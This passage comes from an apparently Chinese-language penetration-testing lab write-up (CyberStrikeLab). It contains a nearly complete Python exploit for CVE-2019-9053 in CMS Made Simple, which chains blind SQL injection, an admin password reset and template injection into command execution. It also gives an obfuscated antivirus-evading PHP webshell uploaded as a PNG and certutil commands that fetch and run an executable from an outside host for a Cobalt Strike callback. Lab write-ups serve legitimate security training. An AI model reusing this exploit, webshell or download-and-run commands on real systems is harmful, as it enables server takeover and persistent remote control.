</span></span><span class="line"><span class="cl">       <span class="s2">&#34;m1_idlist&#34;</span><span class="p">:</span> <span class="s2">&#34;,1)) and </span><span class="si">%s</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="n">exp</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">moduleinterface.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span> <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;Posted by:&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="k">else</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_sqli</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="n">c_range</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># CVE-2019-9053</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">c_range</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># &lt;&gt; characters are html escaped so we just have =</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># substr w/ from/for because anymore commas and the string is broken up resulting in an invalid query</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">determine_bool</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="s2">&#34;,1)) and ascii(substr((</span><span class="si">%s</span><span class="s2">) from </span><span class="si">%d</span><span class="s2"> for 1))=</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">i</span><span class="p">)):</span> <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_string</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="n">leak_name</span><span class="p">,</span> <span class="n">max_length</span><span class="p">,</span> <span class="n">c_range</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;(+) </span><span class="si">%s</span><span class="s2">: &#34;</span> <span class="o">%</span> <span class="n">leak_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">leak_string</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">max_length</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span> <span class="o">=</span> <span class="n">trigger_sqli</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">sql</span><span class="p">,</span> <span class="n">c_range</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># username is probably &lt; 25 characters</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">leak_string</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak_string</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;(-) sql injection failed for </span><span class="si">%s</span><span class="s2">!&#34;</span> <span class="o">%</span> <span class="n">leak_name</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">leak_string</span>    
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reset_pwd_stage1</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">usr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;forgottenusername&#34;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;forgotpwform&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">admin/login.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="p">(</span><span class="s2">&#34;User Not Found&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">),</span> <span class="s2">&#34;(-) password reset failed!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reset_pwd_stage2</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="n">usr</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span>      <span class="c1"># just reset to the username</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;passwordagain&#34;</span> <span class="p">:</span> <span class="n">usr</span><span class="p">,</span> <span class="c1"># just reset to the username</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;changepwhash&#34;</span> <span class="p">:</span> <span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;forgotpwchangeform&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;loginsubmit&#34;</span> <span class="p">:</span> <span class="s2">&#34;Submit&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">admin/login.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">d</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;Welcome: &lt;a href=</span><span class="se">\&#34;</span><span class="s2">myaccount.php\?__c=[a-z0-9]*</span><span class="se">\&#34;</span><span class="s2">&gt;(.*)&lt;\/a&gt;&#34;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="k">match</span><span class="p">,</span> <span class="s2">&#34;(-) password reset failed!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">usr</span><span class="p">,</span> <span class="s2">&#34;(-) password reset failed!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak_simplex</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">csrf</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;mact&#34;</span> <span class="p">:</span> <span class="s2">&#34;DesignManager,m1_,admin_edit_template,0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__c&#34;</span> <span class="p">:</span> <span class="n">csrf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;m1_tpl&#34;</span> <span class="p">:</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">admin/moduleinterface.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">page</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">HTML</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tpl</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">&#34;//textarea//text()&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">tpl</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;(-) leaking template failed!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">tpl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_locks</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">csrf</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;mact&#34;</span> <span class="p">:</span> <span class="s2">&#34;DesignManager,m1_,admin_clearlocks,0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__c&#34;</span> <span class="p">:</span> <span class="n">csrf</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;m1_type&#34;</span> <span class="p">:</span> <span class="s2">&#34;template&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">admin/moduleinterface.php&#34;</span> <span class="o">%</span> <span class="n">t</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) usage: </span><span class="si">%s</span><span class="s2"> &lt;host&gt; &lt;path&gt; &lt;cmd&gt;&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) eg: </span><span class="si">%s</span><span class="s2"> 192.168.75.141 / id&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) eg: </span><span class="si">%s</span><span class="s2"> 192.168.75.141 /cmsms/ </span><span class="se">\&#34;</span><span class="s2">uname -a</span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="n">pth</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">pth</span> <span class="o">=</span> <span class="n">pth</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span><span class="k">if</span> <span class="ow">not</span> <span class="n">pth</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="k">else</span> <span class="n">pth</span>
</span></span><span class="line"><span class="cl">    <span class="n">pth</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">pth</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">pth</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="k">else</span> <span class="n">pth</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># target = &#34;http://%s%s&#34; % (sys.argv[1], pth)</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span><span class="o">=</span><span class="s2">&#34;http://www.my.cs1ab.com/&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) targeting </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">determine_bool</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s2">&#34;1=1&#34;</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">determine_bool</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s2">&#34;1=2&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) sql injection working!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) leaking the username...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;cslab&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">(+) resetting the </span><span class="si">%s</span><span class="s2">&#39;s password stage 1&#34;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">reset_pwd_stage1</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) leaking the pwreset token...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pwreset</span> <span class="o">=</span> <span class="n">leak_string</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">target</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;select value from cms_userprefs where preference=0x70777265736574 and user_id=1&#34;</span><span class="p">,</span> <span class="c1"># qoutes will break things</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;pwreset&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">32</span><span class="p">,</span> <span class="c1"># md5 hash is always 32</span>
</span></span><span class="line"><span class="cl">        <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span><span class="mi">58</span><span class="p">))</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">103</span><span class="p">))</span> <span class="c1"># charset: 0-9a-f</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">pwreset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">(+) done, resetting the </span><span class="si">%s</span><span class="s2">&#39;s password stage 2&#34;</span> <span class="o">%</span> <span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">reset_pwd_stage2</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">pwreset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;(+) logging in...&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">csrf</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;(+) leaking simplex template...&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">remove_locks</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">csrf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">simplex_tpl</span> <span class="o">=</span> <span class="n">leak_simplex</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">csrf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;(+) injecting payload and executing cmd...</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rce_tpl</span> <span class="o">=</span> <span class="s2">&#34;{function name=&#39;rce()</span><span class="si">{}</span><span class="s2">;system(</span><span class="se">\&#34;</span><span class="si">%s</span><span class="se">\&#34;</span><span class="s2">);function &#39;}{/function}endrce&#34;</span> <span class="o">%</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl">    <span class="n">trigger_or_patch_ssti</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">csrf</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">rce_tpl</span><span class="o">+</span><span class="n">simplex_tpl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">index.php&#34;</span> <span class="o">%</span> <span class="n">target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="s2">&#34;endrce&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">trigger_or_patch_ssti</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">csrf</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">simplex_tpl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>原理好像就是先用sql盲注提取密码重置哈希值密码重置为<code>cslab</code>，然后登录后台进行<code>ssti</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203215752405.png"
	width="954"
	height="456"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203215752405_hu15640603536054357358.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203215752405_hu2491279598277540761.png 1024w"
	loading="lazy"
	
		alt="image-20260203215752405"
	
	
		class="gallery-image" 
		data-flex-grow="209"
		data-flex-basis="502px"
	
></p>
<p>执行成功了，登入网站然后上线<code>CS</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cslab/cslab
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里要一次一次执行命令太麻烦了，这里直接进后台打出文件上传了</p>
<p>首先是准备一个php免杀马，这里密钥是1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$username = &#39;5J549bzx&#39;;
</span></span><span class="line"><span class="cl">$password = &#39;UUd5J549bzxW5J549bzxMllXd29KRjlRVD5J549bzxFOVVd6RmRLVHNLTHk5d25J549bzxFIRG11cERub0lIdnZKcmt1SURsajZYb3I1M2pnSUhvbW9IbGlaSGpnSUhsaHJEb25ZN2pnSUhsazZYbWxxL21pNG5taUpibGhiYmt1NVozWldKemFHVnNiT2E2a09lZ2dRPT0=&#39;;
</span></span><span class="line"><span class="cl">header(&#39;dddddd:&#39;.$username);
</span></span><span class="line"><span class="cl">$arr = apache_response_headers();
</span></span><span class="line"><span class="cl">$template_source=&#39;&#39;;
</span></span><span class="line"><span class="cl">foreach ($arr as $k =&gt; $v) {
</span></span><span class="line"><span class="cl">    if ($k[0] == &#39;d&#39; &amp;&amp; $k[4] == &#39;d&#39;) {
</span></span><span class="line"><span class="cl">        $template_source = str_replace($v,&#39;&#39;,$password);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">$template_source = base64_decode($template_source);
</span></span><span class="line"><span class="cl">$template_source = base64_decode($template_source);
</span></span><span class="line"><span class="cl">$key = &#39;template_source&#39;;
</span></span><span class="line"><span class="cl">$aes_decode=$$key;
</span></span><span class="line"><span class="cl">@eval($aes_decode);
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后编辑成<code>png</code>上传文件（这里直接传一句话木马的png是会被杀的，需要免杀）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203224050540.png"
	width="1118"
	height="455"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203224050540_hu7488909520901532253.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203224050540_hu18144419460196647071.png 1024w"
	loading="lazy"
	
		alt="image-20260203224050540"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<p>然后选中刚刚上传的图片，再点击<code>copy</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203224555420.png"
	width="1111"
	height="589"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203224555420_hu11735665497471028345.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203224555420_hu17722331907218362913.png 1024w"
	loading="lazy"
	
		alt="image-20260203224555420"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="452px"
	
></p>
<p>通过复制功能实现上传木马</p>
<p>连接成功</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203223821214.png"
	width="1188"
	height="787"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203223821214_hu213482572320569091.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203223821214_hu2232551000795160899.png 1024w"
	loading="lazy"
	
		alt="image-20260203223821214"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="362px"
	
></p>
<p>愿意等的话，直接网络分离上线CS也行（有免杀）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python ./gear1.py 172.10.59.35 / &#34;certutil -urlcache -split -f http://172.16.233.2:50055/a1.exe&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">python ./gear1.py 172.10.59.35 / &#34;a1.exe http://172.16.233.2:50055/a1.txt&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag就是管理员哈希，直接抓</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203225003118.png"
	width="1072"
	height="245"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203225003118_hu9670784959057390235.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260203225003118_hu4424940752685867445.png 1024w"
	loading="lazy"
	
		alt="image-20260203225003118"
	
	
		class="gallery-image" 
		data-flex-grow="437"
		data-flex-basis="1050px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2babd46497f956dff3b094cf4d462109
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="flag2-12">flag2
</h3><h4 id="知识点用友rce">知识点：用友RCE
</h4><p>传<code>stowaway</code>的时候记得关一下免杀（我用的CS插件）</p>
<p>看一下ip</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204120659780.png"
	width="818"
	height="375"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204120659780_hu2322986443461372663.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204120659780_hu15932513981332578318.png 1024w"
	loading="lazy"
	
		alt="image-20260204120659780"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="523px"
	
></p>
<p>然后开扫吧</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204121327102.png"
	width="1385"
	height="446"
